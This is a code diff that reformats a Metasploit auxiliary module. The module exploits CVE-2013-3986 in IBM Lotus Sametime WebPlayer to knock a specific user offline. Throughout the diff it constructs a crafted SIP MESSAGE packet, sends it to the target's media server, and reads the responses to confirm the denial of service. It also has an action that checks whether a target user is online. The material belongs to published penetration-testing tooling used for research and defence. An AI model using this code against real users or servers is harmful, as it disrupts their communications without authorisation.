@@ -8,46 +8,54 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'       => 'IBM Lotus Sametime WebPlayer DoS',
-      'Description'  => %q{
-        This module exploits a known flaw in the IBM Lotus Sametime WebPlayer
-        version 8.5.2.1392 (and prior) to cause a denial of service condition
-        against specific users. For this module to function the target user
-        must be actively logged into the IBM Lotus Sametime server and have
-        the Sametime Audio Visual browser plug-in (WebPlayer) loaded as a
-        browser extension. The user should have the WebPlayer plug-in active
-        (i.e. be in a Sametime Audio/Video meeting for this DoS to work correctly.
-      },
-      'Author'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'IBM Lotus Sametime WebPlayer DoS',
+        'Description' => %q{
+          This module exploits a known flaw in the IBM Lotus Sametime WebPlayer
+          version 8.5.2.1392 (and prior) to cause a denial of service condition
+          against specific users. For this module to function the target user
+          must be actively logged into the IBM Lotus Sametime server and have
+          the Sametime Audio Visual browser plug-in (WebPlayer) loaded as a
+          browser extension. The user should have the WebPlayer plug-in active
+          (i.e. be in a Sametime Audio/Video meeting for this DoS to work correctly.
+        },
+        'Author' => [
           'Chris John Riley', # Vulnerability discovery
           'kicks4kittens' # Metasploit module
         ],
-      'License'    => MSF_LICENSE,
-      'Actions'    =>
-        [
-          ['DOS',
+        'License' => MSF_LICENSE,
+        'Actions' => [
+          [
+            'DOS',
             {
               'Description' => 'Cause a Denial Of Service condition against a connected user'
             }
           ],
-          ['CHECK',
+          [
+            'CHECK',
             {
               'Description' => 'Checking if targeted user is online'
             }
           ]
         ],
-      'DefaultAction'  => 'DOS',
-      'References'   =>
-        [
+        'DefaultAction' => 'DOS',
+        'References' => [
           [ 'CVE', '2013-3986' ],
           [ 'OSVDB', '99552' ],
           [ 'BID', '63611'],
           [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21654041' ],
           [ 'URL', 'http://xforce.iss.net/xforce/xfdb/84969' ]
         ],
-      'DisclosureDate' => '2013-11-07'))
+        'DisclosureDate' => '2013-11-07',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
@@ -58,19 +66,19 @@ class MetasploitModule < Msf::Auxiliary
           'The SIP URI of the user to be targeted',
           '<target_email_address>@<sametime_media_server_FQDN>'
         ]),
-        OptInt.new('TIMEOUT', [ true,  'Set specific response timeout', 0])
-      ])
-
+        OptInt.new('TIMEOUT', [ true, 'Set specific response timeout', 0])
+      ]
+    )
   end
 
   def setup
     # cleanup SIP target to ensure it's in the correct format to use
     @sipuri = datastore['SIPURI']
-    if @sipuri[0, 4].downcase == "sip:"
+    if @sipuri[0, 4].downcase == 'sip:'
       # remove sip: if present in string
       @sipuri = @sipuri[4, @sipuri.length]
     end
-    if @sipuri[0, 12].downcase == "webavclient-"
+    if @sipuri[0, 12].downcase == 'webavclient-'
       # remove WebAVClient- if present in string
       @sipuri = @sipuri[12, @sipuri.length]
     end
@@ -84,9 +92,9 @@ class MetasploitModule < Msf::Auxiliary
     if action.name == 'CHECK'
       print_status("Checking if user #{@sipuri} is online")
       if check_user
-        print_good("User online")
+        print_good('User online')
       else
-        print_status("User offline")
+        print_status('User offline')
       end
       return
     end
@@ -96,7 +104,7 @@ class MetasploitModule < Msf::Auxiliary
     check_result = check_user
 
     if check_result == false
-      print_error("User is already offline... Exiting...")
+      print_error('User is already offline... Exiting...')
       return
     end
 
@@ -106,11 +114,10 @@ class MetasploitModule < Msf::Auxiliary
     dos_result = dos_user
 
     if dos_result
-      print_good("User is offline, DoS was successful")
+      print_good('User is offline, DoS was successful')
     else
-      print_error("User is still online")
+      print_error('User is still online')
     end
-
   end
 
   def dos_user
@@ -122,19 +129,19 @@ class MetasploitModule < Msf::Auxiliary
       vprint_good("User #{@sipuri} is no responding")
       return true
     elsif res =~ /430 Flow Failed/i
-      vprint_good("DoS packet successful. Response received (430 Flow Failed)")
+      vprint_good('DoS packet successful. Response received (430 Flow Failed)')
       vprint_good("User #{@sipuri} is no longer responding")
       return true
     elsif res =~ /404 Not Found/i
-      vprint_error("DoS packet appears successful. Response received (404 Not Found)")
-      vprint_status("User appears to be currently offline or not in a Sametime video session")
+      vprint_error('DoS packet appears successful. Response received (404 Not Found)')
+      vprint_status('User appears to be currently offline or not in a Sametime video session')
       return true
     elsif res =~ /200 OK/i
       vrint_error("#{peer} - DoS packet unsuccessful. Response received (200)")
       vrint_status("#{peer} - Check user is running an effected version of IBM Lotus Sametime WebPlayer")
       return false
     else
-      vprint_status("Unexpected response")
+      vprint_status('Unexpected response')
       return true
     end
   end
@@ -147,7 +154,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # check response for current user status - common return codes
     if res.nil?
-      vprint_error("No response")
+      vprint_error('No response')
       return false
     elsif res =~ /430 Flow Failed/i
       vprint_good("User #{@sipuri} is no longer responding (already DoS'd?)")
@@ -159,7 +166,7 @@ class MetasploitModule < Msf::Auxiliary
       vprint_good("User #{@sipuri} is online")
       return true
     else
-      vprint_error("Unknown server response")
+      vprint_error('Unknown server response')
       return false
     end
   end
@@ -168,7 +175,7 @@ class MetasploitModule < Msf::Auxiliary
     # create SIP MESSAGE of specified length
     vprint_status("Creating SIP MESSAGE packet #{length} bytes long")
 
-    source_user = Rex::Text.rand_text_alphanumeric(rand(8)+1)
+    source_user = Rex::Text.rand_text_alphanumeric(1..8)
     source_host = Rex::Socket.source_address(datastore['RHOST'])
     src = "#{source_host}:#{datastore['RPORT']}"
     cseq = Rex::Text.rand_text_numeric(3)
@@ -176,14 +183,14 @@ class MetasploitModule < Msf::Auxiliary
     branch = Rex::Text.rand_text_alphanumeric(7)
 
     # setup SIP message in the correct format expected by the server
-    data =  "MESSAGE sip:WebAVClient-#{@sipuri} SIP/2.0" + "\r\n"
-    data << "Via: SIP/2.0/TCP #{src};branch=#{branch}.#{"%.8x" % rand(0x100000000)};rport;alias" + "\r\n"
+    data = "MESSAGE sip:WebAVClient-#{@sipuri} SIP/2.0" + "\r\n"
+    data << "Via: SIP/2.0/TCP #{src};branch=#{branch}.#{'%.8x' % rand(0x100000000)};rport;alias" + "\r\n"
     data << "Max-Forwards: 80\r\n"
     data << "To: sip:WebAVClient-#{@sipuri}" + "\r\n"
     data << "From: sip:#{source_user}@#{src};tag=70c00e8c" + "\r\n"
     data << "Call-ID: #{rand(0x100000000)}@#{source_host}" + "\r\n"
     data << "CSeq: #{cseq} MESSAGE" + "\r\n"
-    data << "Content-Type: text/plain;charset=utf-8" + "\r\n"
+    data << 'Content-Type: text/plain;charset=utf-8' + "\r\n"
     data << "User-Agent: #{source_user}\r\n"
     data << "Content-Length: #{message_text.length}" + "\r\n\r\n"
     data << message_text
@@ -191,38 +198,41 @@ class MetasploitModule < Msf::Auxiliary
     return data
   end
 
-  def timing_get_once(s, length)
-    if datastore['TIMEOUT'] and datastore['TIMEOUT'] > 0
-      return s.get_once(length, datastore['TIMEOUT'])
+  def timing_get_once(sock, length)
+    timeout = datastore['TIMEOUT']
+    if timeout && timeout > 0
+      return sock.get_once(length, timeout)
     else
-      return s.get_once(length)
+      return sock.get_once(length)
     end
   end
 
   def send_msg(msg)
+    s = connect
+    # send message and store response
     begin
-      s = connect
-      # send message and store response
-      s.put(msg + "\r\n\r\n") rescue nil
-      # read response
-      res = timing_get_once(s, 25)
-      if res == "\r\n"
-        # retry request
-        res = timing_get_once(s, 25)
-      end
-      return res
-    rescue ::Rex::ConnectionRefused
-      print_status("Unable to connect")
-      return nil
-    rescue ::Errno::ECONNRESET
-      print_good("DoS packet successful, host not responding.")
-      return nil
-    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-      print_status("Couldn't connect")
-      return nil
-    ensure
-      # disconnect socket if still open
-      disconnect if s
+      s.put(msg + "\r\n\r\n")
+    rescue StandardError
+      nil
     end
+    # read response
+    res = timing_get_once(s, 25)
+    if res == "\r\n"
+      # retry request
+      res = timing_get_once(s, 25)
+    end
+    return res
+  rescue ::Rex::ConnectionRefused
+    print_status('Unable to connect')
+    return nil
+  rescue ::Errno::ECONNRESET
+    print_good('DoS packet successful, host not responding.')
+    return nil
+  rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+    print_status("Couldn't connect")
+    return nil
+  ensure
+    # disconnect socket if still open
+    disconnect if s
   end
 end
